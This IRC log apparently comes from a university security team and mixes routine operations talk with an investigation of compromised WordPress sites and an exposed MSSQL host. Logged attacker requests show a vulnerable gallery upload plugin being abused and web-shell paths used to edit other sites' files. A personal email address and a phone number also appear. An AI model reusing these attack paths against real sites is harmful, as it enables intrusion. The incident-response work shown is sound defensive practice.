2015-01-20 12:28:26	jazoff	oo, there is a reporting api
2015-01-20 12:35:28	wraquel	jschipp: how's cuckoo?
2015-01-20 12:36:47	wraquel	jazoff: you mean older certs that weren't issued by incommon?
2015-01-20 12:37:19	jazoff	no.. i mean older certs that were issued by incommon but not through the new system
2015-01-20 12:37:25	wraquel	Ah.
2015-01-20 12:37:40	jazoff	apparently the reporting api "Allows the Administrator to get Activity Log Report, Client Certificates Report, SSL Certificates Report, Discovery Scan Log Report, Discovery Scan Detail Report and the Latest Discovery Scan Log Report."
2015-01-20 12:37:59	jazoff	not sure if that is what i would need though
2015-01-20 12:38:12	jazoff	the basic api seems pretty straightforward
2015-01-20 12:39:19	wraquel	Looks like in the web interface there's a report option that will show expiring certs.
2015-01-20 12:39:40	wraquel	we just need to enter the date range to look for expirations.
2015-01-20 12:39:50	jschipp	wraquel: cuckoo is halted, still playing catch up, would also like to wait for the additional hd
2015-01-20 12:40:09	wraquel	oh, crap. I was supposed to order one for you
2015-01-20 12:40:16	wraquel	Is it SATA or SAS?
2015-01-20 12:40:41	jschipp	SAS
2015-01-20 12:40:46	wraquel	Right..
2015-01-20 12:42:32	jazoff	hmm, renewing might be tricky. the docs say to renew you need to call the method with "renewId" which is "Given by cm in notification
2015-01-20 12:42:35	jazoff	letter when SSL certificate
2015-01-20 12:42:38	jazoff	was issued
2015-01-20 12:42:55	wraquel	jschipp: 3.5" I assume
2015-01-20 12:47:11	jazoff	well, aside from renewal, at least enrollment is straightforward
2015-01-20 12:48:35	jschipp	I think it was smaller
2015-01-20 12:48:43	jazoff	sffsas?
2015-01-20 12:48:53	jschipp	wut
2015-01-20 12:49:23	jazoff	Small Form Factor sas
2015-01-20 12:49:51	jschipp	ah
2015-01-20 12:49:53	eyrich	my guess is that they are 2.5"
2015-01-20 12:53:58	jschipp	yeah, I believe that's right, I'll double check later today though
2015-01-20 16:04:10	jazoff	wraquel: can you log into https://cert-manager.com/customer/InCommon_test ?
2015-01-20 16:04:18	jazoff	apparently it is a test instance of their site/api
2015-01-21 08:52:02	wraquel	jazoff: Incorrect login details, account is locked, password has expired or your source IP is blocked.
2015-01-21 08:55:21	jazoff	hmm
2015-01-21 08:55:41	jazoff	wonder how we get an account on that
2015-01-21 09:08:58	wraquel	I'm guessing have Joe request one.
2015-01-21 09:09:23	wraquel	Actually, talk to Amy Galey
2015-01-21 09:09:55	wraquel	Er, I guess it's amy hernstein now
2015-01-21 09:10:02	wraquel	amylee76@illinois.edu
2015-01-21 09:34:21	jazoff	so anyway.. the basics of the cert stuff look easy enough
2015-01-21 09:35:00	jazoff	renewing might be a bit tricky (since you need the magic renewId to renew the cert)
2015-01-21 09:36:49	wraquel	There will be some cases initially where the cert will need to be renewed but was issued from Thawte before moving to Incommon.
2015-01-21 09:37:01	wraquel	So, I guess those will just have to be detected as 'new' requests.
2015-01-21 09:37:18	jazoff	yeah.. it's just a request for a new cert with the same parameters, right?
2015-01-21 09:37:25	wraquel	pretty much
2015-01-21 09:37:35	jazoff	that's easy enough
2015-01-21 09:37:54	jazoff	bet i can also build a feature where you can put a host:port and have it fetch the current cert to use as a template
2015-01-21 09:38:35	wraquel	Sounds good.
2015-01-21 09:38:48	wraquel	Want to add a pluggable option to pull ssl logs from bro?
2015-01-21 09:39:13	jazoff	doing that might be tricky, but i can at least make things plugable
2015-01-21 10:01:44	jschipp	Liam and Dustin created an intel service catered toward Bro: https://intel.criticalstack.com/
2015-01-21 10:07:23	jschipp	api too, maybe it will be better than CIF?
2015-01-21 10:07:37	jschipp	going to try and play with it
2015-01-21 10:07:55	jazoff	it's kind of like CIF as a service
2015-01-21 10:17:58	jschipp	yerp
2015-01-21 10:18:06	jazoff	just read only
2015-01-21 10:59:07	jazoff	found an interesting note in the use cases doc from bob 'As the renewal function in the CA software involves both issuing and revocation, this will follow the same workflow as requesting a new certificate, in order to allow the user time to install the new certificate before the old one is invalidated'
2015-01-21 10:59:32	jazoff	so that seems to indicate that I shouldn't use the renewal feature since that automatically revokes the old one?
2015-01-21 13:30:57	jschipp	jazoff: did you push your ntp edits from last week to production and ncsa_production?
2015-01-21 13:31:03	jazoff	no
2015-01-21 13:31:10	jazoff	forgot to follow up with soehlert 
2015-01-21 13:31:27	jazoff	he wrote the original module so I wanted him to look it over first
2015-01-21 13:31:58	eyrich	what machine group is tepid-centos in?
2015-01-21 13:32:37	jazoff	is that just tepid.ncsa ?
2015-01-21 13:32:49	jazoff	according to motd, 'This is a development server'
2015-01-21 13:32:50	jschipp	nvm, it's in development
2015-01-21 13:33:26	jschipp	I can get a ticket just fine on tepid using the NCSA realm
2015-01-21 13:33:51	jazoff	the clock is off though
2015-01-21 13:34:34	jschipp	it matches my other machines like the relays
2015-01-21 13:34:43	jazoff	hmm
2015-01-21 13:34:45	jschipp	which are in prod.
2015-01-21 13:34:49	jschipp	'3
2015-01-21 13:34:50	jschipp	err
2015-01-21 13:35:13	eyrich	is it possible the tg kerberos server is wrong?
2015-01-21 13:35:30	jazoff	it doesn't have the updated ntp.conf though
2015-01-21 13:35:47	jschipp	that's what I'm thinking, maybe something happened on it
2015-01-21 13:37:36	jazoff	oh, tepid is one of the ca boxes that has the different template :)
2015-01-21 13:37:45	eyrich	ah
2015-01-21 13:38:18	eyrich	ya it needs this line: restrict 192.168.10.0 mask 255.255.255.0 nomodify notrap
2015-01-21 13:38:28	jazoff	it has that
2015-01-21 13:38:37	eyrich	along with the new stuff from last week
2015-01-21 13:38:45	jazoff	it does not have that
2015-01-21 13:38:50	eyrich	can you do that?
2015-01-21 13:39:04	jazoff	yeah, gimme a few minutes, needs some rejigginer
2015-01-21 13:39:08	jazoff	rejiggering
2015-01-21 13:39:09	eyrich	thanks
2015-01-21 13:41:57	jschipp	ah, lol
2015-01-21 13:48:37	jazoff	ok, changed ( i think)
2015-01-21 13:49:09	jazoff	looks like it worked
2015-01-21 13:49:23	jazoff	it got the tinker panic 0 and the local clocksource thing was removed
2015-01-21 13:50:43	eyrich	thanks
2015-01-21 13:51:13	eyrich	we need make the same changes for warm and cool before they have issues
2015-01-21 13:59:24	jazoff	hmm
2015-01-21 13:59:42	eyrich	they need same settings as tepid
2015-01-21 14:02:11	wraquel	jazoff: whuh? re: renewlal/revokation
2015-01-21 14:02:20	wraquel	Not sure why a renewal requires revokation.
2015-01-21 14:02:28	wraquel	Unless it's a revokation and replace.
2015-01-21 14:02:43	jazoff	not sure, maybe ask bob?
2015-01-21 14:02:47	wraquel	yeah
2015-01-21 14:03:46	wraquel	Just to clarify, are you going to ask him?
2015-01-21 14:03:53	jazoff	yes
2015-01-21 14:03:57	wraquel	k
2015-01-21 14:07:48	jazoff	ok, now this ntp thing..
2015-01-21 14:09:15	jazoff	jschipp: when was teh last time we merged development into production?
2015-01-21 14:09:21	jazoff	looks like there are a lot of changes
2015-01-21 14:31:12	jazoff	merging conflicts..
2015-01-21 14:36:47	jazoff	ok, got development merged into production
2015-01-21 14:37:16	jazoff	still lots of commits that were made directly in production that are not in development though
2015-01-21 14:53:04	jazoff	eyrich: ok, warm is updated...
2015-01-21 14:53:09	jazoff	cool is in ncsa_production so is not updated yet
2015-01-21 14:54:00	eyrich	warm doesnt have the restric 192.168.10.0
2015-01-21 14:54:14	jazoff	hmm
2015-01-21 14:54:26	jazoff	correct
2015-01-21 14:54:37	eyrich	pretty sure it should
2015-01-21 14:56:07	jazoff	yes.. it should in a second
2015-01-21 14:56:19	jazoff	there it goes
2015-01-21 15:03:20	eyrich	cool is using the wrong peer list and doesn have the 192.168.10 exception either
2015-01-21 15:10:36	jazoff	yeah, cool is set to use ncsa_production
2015-01-21 15:16:26	jazoff	soehlert: so.. ncsa_production appears to be a bit of a mess.. 
2015-01-21 15:29:50	jazoff	too many conflicts to merge production into it.. not sure what is up there
2015-01-21 15:29:54	jazoff	mostly it's from the nagios module
2015-01-21 16:23:50	jschipp	jazoff: yeah, I do my nagios commits manually so I don't have to merge all the time
2015-01-21 16:25:05	jschipp	I like the idea of doing pieces e.g. merging individual module directories, rather than merging the entire branch
2015-01-21 16:25:23	jschipp	$ git checkout production
2015-01-21 16:25:35	jschipp	$ git checkout development modules/nagios/*
2015-01-21 16:25:43	jschipp	$ git commit ...
2015-01-21 16:41:58	jazoff	can you do that?
2015-01-21 16:42:06	jazoff	i cherry-pick commits when I want to move individual ones
2015-01-21 16:42:19	jazoff	are you just committing the same thing twice?
2015-01-21 16:42:44	jazoff	cherry-pick does make a new commit, but it avoids merge conflicts from what i can tell
2015-01-22 10:44:27	jschipp	jazoff: yeah, it grabs all the changes from development and stages it in production branch, then commit it to the branch
2015-01-22 10:44:52	jazoff	ah
2015-01-22 10:45:00	jazoff	well, that seems to confuse git merge :(
2015-01-22 10:46:35	jschipp	yeah, true but I find it preferable because we all work on different directories in dev and they're never ready for production at the same time
2015-01-22 11:27:38	jschipp	eyrich: cool has the same ntp settings as warm now
2015-01-22 11:27:45	jschipp	let me know if there are issues
2015-01-22 13:04:59	eyrich	looks goos
2015-01-22 13:05:01	eyrich	good
2015-01-22 13:05:02	eyrich	thanks
2015-01-22 13:15:01	wraquel	Did the e1000 issue get fixed?
2015-01-22 13:36:20	jschipp	going through all the popular top 2014 metal albums list e.g. http://www.metalinjection.net/lists/best-of-2014/robs-top-10-favorite-metal-albums-of-2014
2015-01-22 13:37:01	jschipp	Behemoth's new album The Satanist is pretty dope
2015-01-22 13:37:43	jschipp	so is 1 and 2 on that list, which is what I would have voted for if I made a list
2015-01-22 13:40:24	jazoff	e1000 issue?
2015-01-22 13:40:36	jazoff	oh, the vmware nic thing?
2015-01-22 13:41:10	eyrich	fixing e1000 on warm is going to reuquired scheduled down time
2015-01-22 13:41:29	eyrich	scheduled/coordinated
2015-01-22 13:51:09	jschipp	i'm getting tired of writing nagios plugins :(
2015-01-22 14:04:10	wraquel	you volunteered
2015-01-22 14:04:22	wraquel	;)
2015-01-22 14:06:10	jschipp	lol I know
2015-01-22 14:06:30	jschipp	my fault but it never ends
2015-01-22 14:13:26	wraquel	What did we end up doing about myrcom licenses for the new bro systems?
2015-01-22 14:13:37	wraquel	Were we staying with 2.0 or upgrading with the 100G budget?
2015-01-22 14:18:49	eyrich	i dont know what got decided. I dont think I ever got a quote for an upgrade so I didnt turn one in
2015-01-22 14:19:09	eyrich	its probably not too late if someone gets a quote
2015-01-22 14:29:20	jazoff	i had a quote...
2015-01-22 14:29:32	jazoff	I think we decided to just stick with 2.0 for now
2015-01-22 14:29:34	eyrich	did I get a copy of it
2015-01-22 14:29:38	jazoff	no
2015-01-22 14:29:54	jazoff	maybe
2015-01-22 14:29:57	jazoff	i will forward it now
2015-01-22 14:30:15	jazoff	ah, I did. oct 23
2015-01-22 14:30:27	eyrich	oh wait
2015-01-22 14:30:51	eyrich	never mind - it got sent to purchasing
2015-01-22 14:31:26	eyrich	4 things ordered for 100GB - Arista, Bro cluster, Koi storage nodes, myricom snivver3
2015-01-22 14:36:03	jazoff	oh, ok then :)
2015-01-22 14:36:28	jazoff	not much of a change on our end.. it's just a matter of swapping out an rpm and importing the licenses
2015-01-22 14:56:04	wraquel	cool
2015-01-23 09:15:37	jazoff	so I found a post the other day about a UDP reflection attack in MSSQL
2015-01-23 09:15:49	jazoff	added 1434 to the bro script and it looks like we got a hit last night
2015-01-23 09:15:55	jazoff	Message: UDP DoS between 212.118.136.13:27015/udp and 141.142.51.7:1434/udp - orig_bytes=24432 resp_bytes=1301004
2015-01-23 09:16:03	jazoff	resp/dst hostname: npcf-power.ncsa.illinois.edu
2015-01-23 09:16:03	jazoff	orig/src hostname: riy-games1.saudi.net.sa
2015-01-23 09:16:15	jazoff	the fact that there is a machine called npcf-power that is on the internet is kinda scary
2015-01-23 09:16:30	jazoff	http://npcf-power.ncsa.illinois.edu/ = default IIS page
2015-01-23 09:22:16	jazoff	yeah, the PoC on http://kurtaubuchon.blogspot.com/2015/01/mc-sqlr-amplification-ms-sql-server.html works
2015-01-23 09:23:11	jazoff	b'\x05\xd2\x00ServerName;NPCF-POWER;InstanceName;ION;IsClustered;No;Version;9.00.5000.00;tcp;52189;np;\\\\NPCF-POWER\\pipe\\MSSQL$ION\\sql\\query;;ServerName;NPCF-POWER;InstanceName;POWERLOGIC;IsClustered;No;Version;9.00.5000.00;;'
2015-01-23 09:50:19	jazoff	netdot says it is owned by tdurbin
2015-01-23 10:33:18	wraquel	is the netdot link on portal-sec? If not, can you add it?
2015-01-23 10:33:32	jazoff	it's not.. there's a credentials issue
2015-01-23 10:33:42	wraquel	for netdot?
2015-01-23 10:33:45	jazoff	it authenticates against kerberos
2015-01-23 10:33:51	jazoff	so I can run it locally using my password
2015-01-23 10:37:38	wraquel	Wait. Is your access to netdot via ssh or http?
2015-01-23 10:37:42	jazoff	http
2015-01-23 10:57:56	jazoff	based on the bro log archive that host looks new
2015-01-23 10:58:06	jazoff	er, bad grep command
2015-01-23 11:02:15	jazoff	2014-06-26 is when it showed up from what I can tell
2015-01-23 11:15:59	jazoff	ah, though based on software.log, much more recent
2015-01-23 11:16:36	jazoff	looks like it may in fact have only exists for a week or two
2015-01-23 11:16:51	jazoff	IIS first showed up 2015-01-14T00:03:28-0600
2015-01-23 11:35:13	wraquel	Haven't heard back from splunk yet?
2015-01-23 11:35:20	jazoff	nope
2015-01-23 11:35:31	jazoff	logged into the support site the other day to verify my reply made it ther
2015-01-23 13:00:32	jazoff	http://ascii.textfiles.com/archives/4546
2015-01-23 13:00:46	jazoff	I see a small surge in NCSA Mosiac users  coming
2015-01-23 15:42:45	wraquel	Fleury doesn't have ssh access on fog right?
2015-01-23 15:43:08	wraquel	They're wanting to track config changes and wanted to see if they could leverage our system using git.
2015-01-23 15:43:52	wraquel	I have no problem with the process of using git for tracking config history, but since ours is sitting on the private network behind fog/dew I don't think that'll be possible.
2015-01-23 15:44:15	jazoff	well.. you don't really need to use a server to host the repo just to use git
2015-01-23 15:44:45	wraquel	yeah, but we also don't want to add any extra services on the existing CA systems.
2015-01-23 15:45:06	wraquel	Does CA have an isolated net?
2015-01-23 15:45:09	jazoff	right.. but git is not a service
2015-01-23 15:45:33	jazoff	they only need a server if they want to centralize the configs. if they just want to see what changed on a host they can use something like etckeeper
2015-01-23 15:45:35	wraquel	I mean, adding another software package, etc, for config management on the CA servers themselves.
2015-01-23 15:45:46	wraquel	They want to keep a history of changes.
2015-01-23 15:45:51	jazoff	ah
2015-01-23 15:45:55	jazoff	splunk used to support that
2015-01-23 15:47:39	jazoff	you used to be able to use the filemon feature to monitor a directory for changes vs. log files for appends
2015-01-23 15:49:56	jazoff	I guess a better question is can they just use something like ansible for pushing out config changes?
2015-01-23 16:10:00	wraquel	How quickly can a VM be brought up on the CA net that just does git?
2015-01-23 16:10:37	wraquel	Just playing with an idea.
2015-01-23 16:10:47	wraquel	git server.
2015-01-23 16:19:27	jazoff	well if they just want to use git over ssh, then all that is needed is the git package installed
2015-01-23 16:20:33	wraquel	I think that's all. I'm asking for clarification.
2015-01-26 07:33:12	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2015-01-26 07:41:58	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-01-26 08:11:54	jazoff	so, what should be done about npcf-power.ncsa.illinois.edu ?
2015-01-26 08:12:48	eyrich	probably need to wait for Warren and Adam on that one.
2015-01-26 08:13:01	jazoff	it's also running RDP
2015-01-26 08:13:08	eyrich	can you help start figuring out how the wordpress servers got comprimised
2015-01-26 08:13:18	jazoff	sure
2015-01-26 08:13:27	jazoff	i'm going to go out on a limb and guess... wordpress
2015-01-26 08:13:41	eyrich	well ya, but they say there were up to daye
2015-01-26 08:13:42	eyrich	date
2015-01-26 08:13:49	jazoff	well sure
2015-01-26 08:13:59	jazoff	but wordpress is always up to date when new exploits come out
2015-01-26 08:14:05	eyrich	i wonder if they have the brute force protections in place that we suggested last year
2015-01-26 08:14:11	eyrich	right
2015-01-26 08:14:56	eyrich	RE NPCF powetr i thought that power thing was supposed to be ACLd, I wonder if those got lost in a router upgrade
2015-01-26 08:16:00	eyrich	what server has the syslogs ?
2015-01-26 08:16:11	jazoff	seclogs or lowp
2015-01-26 08:22:02	eyrich	where on seclogs?
2015-01-26 08:22:39	eyrich	nvr mind
2015-01-26 08:24:41	eyrich	web admin says astro hit at 7:41am jan 25
2015-01-26 08:28:39	jazoff	some requests from 110.139.95.106 at that time
2015-01-26 08:28:44	jazoff	but all GETS and nothing obvious..
2015-01-26 08:29:00	jazoff	unless it was something in a non-logged http header that did it
2015-01-26 08:30:42	eyrich	ITS is going to work on getting apache logs
2015-01-26 08:31:33	jazoff	110.139.95.106 did hit wordpress urls on other hosts
2015-01-26 08:32:05	jazoff	ooooh
2015-01-26 08:32:09	jazoff	this is interesting
2015-01-26 08:32:16	jazoff	POST    ichass.illinois.edu     /wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
2015-01-26 08:32:42	jazoff	POST    ichass.illinois.edu     /wp-content/uploads/angel.php?editfile=/afs/ncsa.uiuc.edu/web/astro.ncsa.illinois.edu/site/htdocs/index.php
2015-01-26 08:32:54	jazoff	POST    ichass.illinois.edu     /wp-content/uploads/angel.php?editfile=/afs/ncsa.uiuc.edu/web/brainstormhpcd.org/site/htdocs/x.php
2015-01-26 08:32:56	jazoff	so, that's how they did it
2015-01-26 08:33:18	eyrich	damn - thats good work
2015-01-26 08:34:12	jazoff	so, lots more compromised sites than they think
2015-01-26 08:34:39	wraquel	oh.. that's not good.
2015-01-26 08:34:50	jazoff	astro.ncsa.illinois.edu avl.ncsa.illinois.edu brainstormhpcd.org dev.teragrid.org ichass.illinois.edu iclcs.uiuc.edu images.ncsa.uiuc.edu informatics.illinois.edu islcs.ncsa.illinois.edu labsportal.nationaldataservice.org lait.ncsa.illinois.edu
2015-01-26 08:34:54	wraquel	effing file uploader.
2015-01-26 08:35:33	wraquel	what about npcf-power? Is that the mssql one?
2015-01-26 08:36:08	jazoff	yeah
2015-01-26 08:36:39	wraquel	Did you send an email about it last week to tdurbin?
2015-01-26 08:37:08	jazoff	no.. wasn't sure if that was the right thing to do
2015-01-26 08:37:10	eyrich	wraquel: should be BHR those hosts?
2015-01-26 08:38:09	wraquel	crap. I'll give Tom a call.
2015-01-26 08:39:24	wraquel	sigh
2015-01-26 08:41:46	wraquel	justin, can you send a quick synopsis on your findings to security@ncsa. Randy will want an update.
2015-01-26 08:43:35	wraquel	I would say, anything we don't know about contact help+its to have them help identify the admin.
2015-01-26 08:46:59	jazoff	yeah
2015-01-26 08:47:05	jazoff	slicing and dicing the log file
2015-01-26 08:48:02	wraquel	eyrich: are any of those hosts scanned by Qualys?
2015-01-26 08:48:51	eyrich	no
2015-01-26 08:52:01	eyrich	dev.teragrid.org - 67.192.36.177
2015-01-26 08:54:08	wraquel	what about 67.192.36.177?
2015-01-26 08:55:13	wraquel	I see. it was ichass that gave access to upload files to other afs shares it had access to.
2015-01-26 08:55:35	wraquel	110.139.95.106 is BHRed?
2015-01-26 08:56:16	eyrich	no
2015-01-26 08:56:32	eyrich	is now
2015-01-26 08:56:32	wraquel	well, it was only used to compromise the host. haven't seen it since.
2015-01-26 08:56:41	wraquel	Yeah, good to have it blocked for now.
2015-01-26 08:57:04	eyrich	for 1 year - confirmed none of the hosts justin listed are qualys scanned
2015-01-26 08:57:15	wraquel	damn, that guy was rummaging around.
2015-01-26 08:57:44	wraquel	Bill is going to ask why they aren't being scanned.
2015-01-26 08:59:26	wraquel	Outside BW and XSEDE what hosts do we scan?
2015-01-26 09:00:15	eyrich	because  ITS never asked and I was never told we were funded to scan none BW and xsede hosts
2015-01-26 09:00:25	wraquel	That's what I thought.
2015-01-26 09:00:28	eyrich	we scan a lot, you can see them in the scan report
2015-01-26 09:01:00	wraquel	Just want to be able to answer the question if it comes up where, "X is not BW or XSEDE funded, why are they being scanned".
2015-01-26 09:01:23	wraquel	But, the 'asked' part helps.
2015-01-26 09:02:45	eyrich	Randy approved all non BW and XSEDE related hosts that are scanned - which are LSST, Brown Dog/Kooper, iforge
2015-01-26 09:02:51	jazoff	so the interesting part, they seem to have left http://ichass.illinois.edu/ itself alone
2015-01-26 09:03:24	wraquel	http://ichass.ncsa.illinois.edu/wp-content/uploads/angel.php
2015-01-26 09:03:38	eyrich	why would the servers be setup to allow one host to write to another hosts afs directory?
2015-01-26 09:04:00	wraquel	the web server has read/write access to those directories.
2015-01-26 09:04:09	wraquel	It was running as the web service.
2015-01-26 09:04:10	 *	jazoff facepalm
2015-01-26 09:04:28	wraquel	So we need a file stat for that file, angel.php.
2015-01-26 09:04:53	eyrich	they are hosted on differetn servers, shouldnt each server have its own account and only be allowed to access the directories for the sites it services
2015-01-26 09:06:08	wraquel	But they're all hosted by ITS on afs
2015-01-26 09:06:13	wraquel	So, for convenience.....
2015-01-26 09:08:08	wraquel	eyrich go ahead and block npcf-power. Just talked with tom
2015-01-26 09:08:35	wraquel	Soooooo. yeah, it sits int he command center and they use it to manage NPCF power systems.
2015-01-26 09:08:54	wraquel	I breaking out the whiskey when I get home tonight.
2015-01-26 09:08:59	eyrich	wraquel: done
2015-01-26 09:09:06	jazoff	so.. why did it show up all of a sudden?
2015-01-26 09:09:13	jazoff	assuming it's not a new system
2015-01-26 09:09:37	eyrich	i think a router ACL got lost
2015-01-26 09:09:43	wraquel	That's a very good question. I'll follow that up. Tom's going down to check to see if the block affects his access.
2015-01-26 09:10:42	wraquel	Captain Team J
2015-01-26 09:10:43	wraquel	[+] We Fuck your security [+]
2015-01-26 09:10:45	wraquel	whee
2015-01-26 09:11:29	wraquel	nice. it can create a reverse shell.
2015-01-26 09:11:33	wraquel	....
2015-01-26 09:13:23	wraquel	I have access on afs...
2015-01-26 09:13:24	wraquel	fun
2015-01-26 09:13:43	wraquel	oooh..
2015-01-26 09:13:47	wraquel	oooooooooo
2015-01-26 09:14:45	wraquel	2015-01-25 07:13:57.000000001 -0600
2015-01-26 09:16:37	wraquel	2014-10-24 14:57:23.000000000 -0500
2015-01-26 09:17:44	wraquel	there are other uploaded files.
2015-01-26 09:18:06	wraquel	Looks like this was popped in October.
2015-01-26 09:19:40	jazoff	fun
2015-01-26 09:20:32	wraquel	zipping up the site now.
2015-01-26 09:20:41	wraquel	and shit. should have stated first.
2015-01-26 09:24:05	jazoff	they don't run noatime/relatime anyway?
2015-01-26 09:24:16	jazoff	atime on web servers kinda sucks.. every web request causes a fs write
2015-01-26 09:24:20	wraquel	I have no idea how any of that is mounted.
2015-01-26 09:24:33	wraquel	Yeah, all I care about is ctime.
2015-01-26 09:24:46	wraquel	ok, I grabbed a copy of the site.
2015-01-26 09:26:16	wraquel	:( they replaced fileupload.php
2015-01-26 09:27:27	wraquel	It looks like this may have been discovered from a google search.
2015-01-26 09:27:56	jazoff	i think they usually are
2015-01-26 09:30:09	wraquel	http://www.securityfocus.com/bid/57100/exploit
2015-01-26 09:30:42	jazoff	seriously?
2015-01-26 09:30:49	wraquel	reflex gallery plugin
2015-01-26 09:30:57	jazoff	look at the 'exploit'
2015-01-26 09:44:24	eyrich	can you do a history of ichass.illinois.edu IP addresses
2015-01-26 09:44:49	eyrich	as in the host ip history
2015-01-26 09:44:50	jazoff	ninfo bro_pdns ichass.illinois.edu
2015-01-26 09:44:50	ncsabot	Query  Type  Answer  TTL  Count  First  Last
2015-01-26 09:44:50	ncsabot	ichass.illinois.edu - 128.174.199.223 7200 1 2014-09-04 12:24:29.190631 2014-09-04 12:24:29.190631
2015-01-26 09:44:50	ncsabot	ichass.illinois.edu A 128.174.199.223 7200 51 2014-09-04 12:24:29.189992 2014-11-12 14:07:10.727940
2015-01-26 09:44:50	ncsabot	ichass.illinois.edu AAAA - None 13792 2014-11-12 14:07:10.729765 2015-01-26 09:41:18.138135
2015-01-26 09:44:50	ncsabot	ichass.illinois.edu A 141.142.193.38 6015 527 2014-11-19 13:43:57.968721 2015-01-26 09:28:43.846510
2015-01-26 09:44:51	ncsabot	www.ichass.illinois.edu A ichass.illinois.edu 7200 25 2014-11-19 13:44:11.568140 2015-01-26 09:16:54.797105
2015-01-26 09:44:52	ncsabot	- - ichass.illinois.edu 86400 7689 2014-12-03 13:00:12.493996 2015-01-26 09:40:12.726383
2015-01-26 09:44:55	ncsabot	38.193.142.141.in-addr.arpa PTR ichass.illinois.edu 86400 111 2014-12-03 13:02:40.389731 2015-01-26 09:05:41.273928
2015-01-26 09:44:57	ncsabot	38.193.142.141.in-addr.arpa - ichass.illinois.edu 86400 28 2014-12-03 14:53:38.276949 2015-01-26 09:05:41.274177
2015-01-26 09:44:59	ncsabot	ichass.illinois.edu - 141.142.193.38 7200 2 2014-12-19 04:00:04.949441 2015-01-21 15:16:05.563767
2015-01-26 09:45:01	ncsabot	ichass.illinois.edu - - None 11 2014-12-21 05:01:33.550266 2015-01-26 09:28:43.859307
2015-01-26 09:45:03	ncsabot	ichass.illinois.edu MX - None 3 2015-01-26 09:20:00.775008 2015-01-26 09:28:43.858431
2015-01-26 09:45:57	jazoff	those 128.174.199.223 might be not right though
2015-01-26 09:46:40	eyrich	it makes sense. ichass was copied from a uiuc host
2015-01-26 09:46:42	eyrich	in oct
2015-01-26 09:46:48	jazoff	ah, ok then :)
2015-01-26 09:46:57	eyrich	the bad plugin came with it
2015-01-26 09:54:03	wraquel	Justin, what's your phone #, Randy wants to loop you in this meeting
2015-01-26 09:54:29	jazoff	one sec
2015-01-26 09:54:43	jazoff	 Lync Phone Number:
2015-01-26 09:54:44	jazoff	+1 217 244 7345 
2015-01-26 10:17:51	wraquel	where can I store this website dump?
2015-01-26 10:17:55	wraquel	git-annex?
2015-01-26 10:18:13	jazoff	yeah.. that reminds me, that needs to be setup somewhere
2015-01-26 10:18:59	jazoff	i added some files to the incident reports repo using it,m but can't push to git-sec
2015-01-26 10:21:21	wraquel	Well, I can strip out the affected files. there are only about 3.
2015-01-26 10:21:24	wraquel	5
2015-01-26 10:21:37	jazoff	yeah, if they are small just commit em regularly
2015-01-26 10:30:25	wraquel	who first responded and when to this incident? 
2015-01-26 10:30:33	 *	jazoff looks at eyrich 
2015-01-26 10:30:37	wraquel	working on a timeline for bill.
2015-01-26 10:30:49	wraquel	jazoff: when did you start looking into it?
2015-01-26 10:31:04	eyrich	everything i did is in emails
2015-01-26 10:31:14	jazoff	8:13
2015-01-26 10:31:41	wraquel	Looks like Adam first noticed it.
2015-01-26 10:32:15	wraquel	When I wake up, unless my phone is chirping at me, I get breakfast for the kids, get them dressed and take them to the bus stop. It pretty much takes my whole attention.
2015-01-26 10:33:25	jazoff	ah, I try to check mail before breakfast, but mondays are well.. mondays :)
2015-01-26 10:34:00	wraquel	Making eggs, lunches and waking up groggy kids pretty much took every spare moment.
2015-01-26 10:35:38	jazoff	egg casserole ftw 
2015-01-26 10:35:58	jazoff	make it on sunday, cut into 6ths, breakfast for the week :)
2015-01-26 10:55:39	jschipp	ah, a lot going on this morning I see :/
2015-01-26 10:56:22	jazoff	morning :)
2015-01-26 10:56:40	jschipp	lol
2015-01-26 10:57:03	jazoff	bro updated
2015-01-26 11:03:47	jschipp	yay
2015-01-26 11:04:04	jschipp	looks i should update the Bro Live image
2015-01-26 11:05:36	jazoff	eh, i dunno if it would be worth it
2015-01-26 11:05:52	jazoff	they already have a shell, what's the worst that could happen?
2015-01-26 11:08:23	eyrich	Matt told me things are cleaned, everything has been removed from BHR except ichass, do we know if it is secured?
2015-01-26 11:08:30	wraquel	Not yet
2015-01-26 11:08:59	wraquel	It has files from a previous compromise so one of us needs to walk through it to look for other issues.
2015-01-26 11:09:15	wraquel	I was planning on doing that unless someone else wants to have a go
2015-01-26 11:10:21	wraquel	anyone have exprience with this or any other wordpress scanners? http://wpscan.org/
2015-01-26 11:11:11	jazoff	do you think that is a subset or a superset of what qualys can do?
2015-01-26 11:11:27	wraquel	well, someone would have to fund that.
2015-01-26 11:11:31	wraquel	Or ask nicely
2015-01-26 11:11:38	wraquel	But, otherwise, I dunno.
2015-01-26 11:12:17	wraquel	I don't know how application specific Qualys goes for Wordpress.
2015-01-26 11:12:18	wraquel	eyrich: ?
2015-01-26 11:13:09	eyrich	i have doubts that qualys VM would find issues - it  might tough
2015-01-26 11:13:10	eyrich	though
2015-01-26 12:05:35	wraquel	Is there a quick way to tell how far a log index goes in bro?
2015-01-26 12:05:39	wraquel	er splunk
2015-01-26 12:06:14	jazoff	yeah, in the admin -> indexes section
2015-01-26 12:06:28	jazoff	i think you can also search for alltime and do | head (or is it | tail)
2015-01-26 12:08:09	wraquel	jazoff: look at RI Bro-sig
2015-01-26 12:08:24	wraquel	https://github.com/set-element/misc-scripts/blob/master/wordpress.bro
2015-01-26 12:09:42	jazoff	hmm
2015-01-26 12:09:50	jazoff	it would appear that I am not subscribed to that anymore
2015-01-26 12:10:00	jazoff	forgot to re-sub after I left UA
2015-01-26 12:12:18	wraquel	Timely. Scott Campbell posted a bro script for wordpress and installed plugins.
2015-01-26 12:12:27	jazoff	yeah
2015-01-26 12:12:46	jazoff	couldn't hurt, but I don't know how much it would help
2015-01-26 12:14:26	wraquel	toss it on dev and see what it does.
2015-01-26 12:15:44	jazoff	done
2015-01-26 12:17:15	jazoff	lunch time
2015-01-26 12:49:14	wraquel	bah. http_inbound logs only go back to mid dec
2015-01-26 12:49:22	wraquel	well, on splunk, anyway.
2015-01-26 12:49:28	jazoff	yeah
2015-01-26 12:49:49	jazoff	I did write that REST gateway thing, but it did not work so well
2015-01-26 12:50:03	jazoff	for small results it was ok, for anything large splunk would run out of ram
2015-01-26 12:50:37	jazoff	must be doing something wrong though because there is a splunk thing for hadoop and SQL so somehow that can handle larger data sets
